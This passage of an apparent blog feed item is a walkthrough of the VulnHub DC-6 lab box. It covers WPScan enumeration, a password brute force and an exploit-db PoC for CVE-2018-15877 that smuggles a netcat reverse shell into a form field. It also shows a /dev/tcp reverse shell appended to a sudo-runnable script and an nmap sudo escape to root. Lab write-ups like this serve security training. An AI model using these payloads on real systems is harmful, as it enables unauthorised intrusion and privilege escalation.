-Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 22.48 seconds
-</code></pre></div><h4 id="wpscan">WPScan</h4>
-<p><code>wpscan</code> identifies two vulnerable WP plugins: an RCE and a user role privilege escalation.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
-$ wpscan --url http://wordy/ --enumerate vp --api-token token123 --plugins-detection aggressive
-...
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> plainview-activity-monitor
- | Location: http://wordy/wp-content/plugins/plainview-activity-monitor/
- | Last Updated: 2018-08-26T15:08:00.000Z
- | Readme: http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
- | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> The version is out of date, the latest version is <span style="color:#ae81ff">20180826</span>
- | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Directory listing is enabled
- |
- | Found By: Known Locations <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
- |  - http://wordy/wp-content/plugins/plainview-activity-monitor/, status: <span style="color:#ae81ff">200</span>
- |
- | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#ae81ff">1</span> vulnerability identified:
- |
- | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Title: Plainview Activity Monitor &lt;<span style="color:#f92672">=</span> <span style="color:#ae81ff">20161228</span> - Remote Command Execution <span style="color:#f92672">(</span>RCE<span style="color:#f92672">)</span>
- |     Fixed in: <span style="color:#ae81ff">20180826</span>
- |     References:
- |      - https://wpscan.com/vulnerability/ab749b6c-c405-40e0-8417-0fe1bdb8537c
- |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2018-15877
- |      - https://plugins.trac.wordpress.org/changeset/1930493/plainview-activity-monitor
- |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_plainview_activity_monitor_rce/
- |
- | Version: <span style="color:#ae81ff">20161228</span> <span style="color:#f92672">(</span>50% confidence<span style="color:#f92672">)</span>
- | Found By: Readme - ChangeLog Section <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
- |  - http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
-
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> user-role-editor
- | Location: http://wordy/wp-content/plugins/user-role-editor/
- | Last Updated: 2021-04-05T02:38:00.000Z
- | Readme: http://wordy/wp-content/plugins/user-role-editor/readme.txt
- | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> The version is out of date, the latest version is 4.59
- |
- | Found By: Known Locations <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
- |  - http://wordy/wp-content/plugins/user-role-editor/, status: <span style="color:#ae81ff">200</span>
- |
- | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#ae81ff">1</span> vulnerability identified:
- |
- | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Title: User Role Editor &lt;<span style="color:#f92672">=</span> 4.24 - Privilege Escalation
- |     Fixed in: 4.25
- |     References:
- |      - https://wpscan.com/vulnerability/85e595f5-9f04-4799-9a09-c6675071b12c
- |      - https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/
- |
- | Version: 4.24 <span style="color:#f92672">(</span>80% confidence<span style="color:#f92672">)</span>
- | Found By: Readme - Stable Tag <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
- |  - http://wordy/wp-content/plugins/user-role-editor/readme.txt
-...
-</code></pre></div><p>I&rsquo;m interested with the RCE one, but before that I&rsquo;ll have to find creds.</p>
-<h4 id="brute-forcing-passwords">Brute-forcing passwords</h4>
-<p>At that time, I was stuck for a couple of hours. Asking for a nudge and the answer was to brute force, I didn&rsquo;t know that the box&rsquo;s author actually gave us a hint to create a custom wordlist from <code>rokyou.txt</code>.</p>
-<p><img class="img-container" src="imgs/image-20210419183629054.png" alt="image-20210419183629054"  />
-</p>
-<p>I&rsquo;ll create new wordlist from <code>rockyou.txt</code> and then use it to perform a brute force using <code>wpscan</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
-$ cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt
-→ root@iamf «dc-6» «192.168.43.234» 
-$ wpscan --url http://wordy/ --usernames users --passwords passwords.txt 
-</code></pre></div><p>It returns one valid credentials: <code>mark:helpdesk10</code>.</p>
-<p><img class="img-container" src="imgs/image-20210419184715108.png" alt="image-20210419184715108"  />
-</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-www-data">Shell as www-data</h3>
-<h4 id="wp-dashboard">WP Dashboard</h4>
-<p>With the credentials I obtained, I can login into the admin panel.</p>
-<p><img class="img-container" src="imgs/image-20210531002724008.png" alt="image-20210531002724008"  />
-</p>
-<h4 id="plainview-activity-monitor---rce--cve-2018-15877">Plainview Activity Monitor - RCE  (CVE-2018-15877)</h4>
-<p>From the previous <code>wpscan</code>, I searched the exploit PoC for Plainview Activity Monitor RCE and found this from <a href="https://www.exploit-db.com/exploits/45274">exploit-db</a>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
-  <span style="color:#75715e">&lt;!--  Wordpress Plainview Activity Monitor RCE
-</span><span style="color:#75715e">        [+] Version: 20161228 and possibly prior
-</span><span style="color:#75715e">        [+] Description: Combine OS Commanding and CSRF to get reverse shell
-</span><span style="color:#75715e">        [+] Author: LydA(c)ric LEFEBVRE
-</span><span style="color:#75715e">        [+] CVE-ID: CVE-2018-15877
-</span><span style="color:#75715e">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell
-</span><span style="color:#75715e">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
-</span><span style="color:#75715e">  --&gt;</span>
-  &lt;<span style="color:#f92672">body</span>&gt;
-  &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">pushState</span>(<span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>)&lt;/<span style="color:#f92672">script</span>&gt;
-    &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span>&gt;
-      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ip&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&#34;</span> /&gt;
-      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;lookup&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Lookup&#34;</span> /&gt;
-      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Submit request&#34;</span> /&gt;
-    &lt;/<span style="color:#f92672">form</span>&gt;
-  &lt;/<span style="color:#f92672">body</span>&gt;
-&lt;/<span style="color:#f92672">html</span>&gt;
-</code></pre></div><p>The vulnerability comes from this IP tools feature.</p>
-<p><img class="img-container" src="imgs/image-20210419194814055.png" alt="image-20210419194814055"  />
-</p>
-<p>I&rsquo;ll hit the lookup button and intercept the request on Burp.</p>
-<p>RCE can be achieved by adding a set of malicious OS commands after the command pipe <code>|</code>, semi colon <code>;</code> (stacked command), or logical OR <code>||</code> at the <code>ip</code> section. In this case, I send a reverse shell.</p>
-<p>Here is with command pipe.</p>
-<p><img class="img-container" src="imgs/image-20210419194314291.png" alt="image-20210419194314291"  />
-</p>
-<p>And this one by stacking commands with semicolon.</p>
-<p><img class="img-container" src="imgs/image-20210419200042885.png" alt="image-20210419200042885"  />
-</p>
-<p>I can not find the plugin&rsquo;s source code, my best guess it can be something like this.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">...</span>
-$ip <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ip&#39;</span>]
-$do_something <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;dig </span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">&#34;</span>)
-<span style="color:#f92672">...</span>
-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-graham">Shell as graham</h3>
-<h4 id="internal-enumeration">Internal enumeration</h4>
-<p>The home directory is readable by <code>www-data</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@dc-6:/var/www/html/wp-admin$ find /home 2&gt;/dev/null
-find /home 2&gt;/dev/null
-...
-/home/jens/backups.sh
-....
-/home/mark/stuff/things-to-do.txt
-....
-</code></pre></div><p>I immediately checked the contents of <code>backups.sh</code> and <code>things-to-do.txt</code>.</p>
-<p>The <code>backups.sh</code> script is writable by group <code>devs</code>, and I&rsquo;ll note that.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@dc-6:/var/www/html/wp-admin$ ls -l /home/jens/backups.sh
-ls -l /home/jens/backups.sh
--rwxrwxr-x <span style="color:#ae81ff">1</span> jens devs <span style="color:#ae81ff">50</span> Apr <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> /home/jens/backups.sh
-www-data@dc-6:/var/www/html/wp-admin$ cat /home/jens/backups.sh
-cat /home/jens/backups.sh
-<span style="color:#75715e">#!/bin/bash</span>
-tar -czf backups.tar.gz /var/www/html
-</code></pre></div><p>And this <code>things-to-do.txt</code> contains graham&rsquo;s credentials.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">www-data@dc-6:/var/www/html/wp-admin$ cat /home/mark/stuff/things-to-do.txt
-cat /home/mark/stuff/things-to-do.txt
-Things to do:
-
-- Restore full functionality for the hyperdrive (need to speak to Jens)
-- Buy present for Sarah&#39;s farewell party
-- Add new user: graham - GSo7isUM1D4 - done
-- Apply for the OSCP course
-- Buy new laptop for Sarah&#39;s replacement
-</code></pre></div><h4 id="ssh---graham">SSH - graham</h4>
-<p>I tried the graham&rsquo;s creds, <code>graham:GSo7isUM1D4</code>, on SSH, and it worked.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «dc-6» «192.168.43.234» 
-$ ssh graham@192.168.2.104
-graham@192.168.2.104&#39;s password: 
-Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-graham@dc-6:~$ id
-uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
-</code></pre></div><h3 id="shell-as-jens">Shell as jens</h3>
-<h4 id="sudo-privileges---backupssh">Sudo privileges - backups.sh</h4>
-<p>User <code>graham</code> has sudo privileges on the <code>backups.sh</code> script, and this allows me to run the script as user <code>jens</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">graham@dc-6:~$ sudo -l
-Matching Defaults entries for graham on dc-6:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-
-User graham may run the following commands on dc-6:
-    (jens) NOPASSWD: /home/jens/backups.sh
-graham@dc-6:~$ cat /home/jens/backups.sh
-#!/bin/bash
-tar -czf backups.tar.gz /var/www/html
-graham@dc-6:~$ ls -l /home/jens/backups.sh
--rwxrwxr-x 1 jens devs 50 Apr 26  2019 /home/jens/backups.sh
-</code></pre></div><p>Because the script is also writable by graham (<code>devs</code> group), I can exploit this to escalate myself to <code>jens</code> by adding a reverse shell line to the script and then run it with sudo.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">graham@dc-6:~$ echo <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/192.168.2.108/9000 0&gt;&amp;1&#39;</span> &gt;&gt; /home/jens/backups.sh
-</code></pre></div><p><img class="img-container" src="imgs/image-20210419204321872.png" alt="image-20210419204321872"  />
-</p>
-<h3 id="shell-as--root">Shell as  root</h3>
-<h4 id="sudo-privileges---nmap">Sudo privileges - nmap</h4>
-<p>I found out that user <code>jens</code> is allowed to execute <code>nmap</code> as root user.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jens@dc-6:/home/graham$ sudo -l
-sudo -l
-Matching Defaults entries <span style="color:#66d9ef">for</span> jens on dc-6:
-    env_reset, mail_badpass,
-    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
-
-User jens may run the following commands on dc-6:
-    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/nmap
-</code></pre></div><p>I&rsquo;ll also exploit this using reference from <a href="https://gtfobins.github.io/gtfobins/nmap/">GTFObins</a>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jens@dc-6:/home/graham$ TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>
-jens@dc-6:/home/graham$ echo <span style="color:#e6db74">&#39;os.execute(&#34;/bin/sh&#34;)&#39;</span> &gt; $TF
-jens@dc-6:/home/graham$ sudo nmap --script<span style="color:#f92672">=</span>$TF
-</code></pre></div><p><img class="img-container" src="imgs/image-20210419204616406.png" alt="image-20210419204616406"  />
-</p>
-<p>And here is the flag.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@dc-6:~# cat theflag.txt 
-
-
-Yb        dP 888888 88     88         8888b.   dP&#34;Yb  88b 88 888888 d8b 
- Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
-  YbdPYbdP   88&#34;&#34;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&#34;&#34;   `&#34;&#39; 
-   YP  YP    888888 88ood8 88ood8     8888Y&#34;   YbodP  88  Y8 888888 (8) 
-
-
-Congratulations!!!
-
-Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
-who have provided feedback, and who have taken time to complete these little
-challenges.
-
-If you enjoyed this CTF, send me a tweet via @DCAU7.
-</code></pre></div><hr>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></li>
-<li><a href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a></li>
 </ul>
 ]]></content:encoded>
     </item>
